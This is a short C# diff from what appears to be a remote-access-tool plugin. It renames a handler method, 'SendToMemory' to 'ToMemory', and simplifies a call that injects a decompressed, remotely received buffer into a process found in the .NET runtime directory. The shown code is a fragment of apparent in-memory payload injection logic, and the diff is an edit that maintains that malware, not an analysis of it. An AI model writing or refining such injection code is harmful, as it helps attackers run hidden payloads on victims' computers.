@@ -10,7 +10,7 @@ namespace Plugin.Handler
 {
     public class HandleSendTo
     {
-        public void SendToMemory(MsgPack unpack_msgpack)
+        public void ToMemory(MsgPack unpack_msgpack)
         {
             try
             {
@@ -46,7 +46,7 @@ namespace Plugin.Handler
                     {
                         try
                         {
-                            global::Plugin.SendToMemory.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Zip.Decompress(buffer));
+                            SendToMemory.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Zip.Decompress(buffer));
                         }
                         catch (Exception ex)
                         {
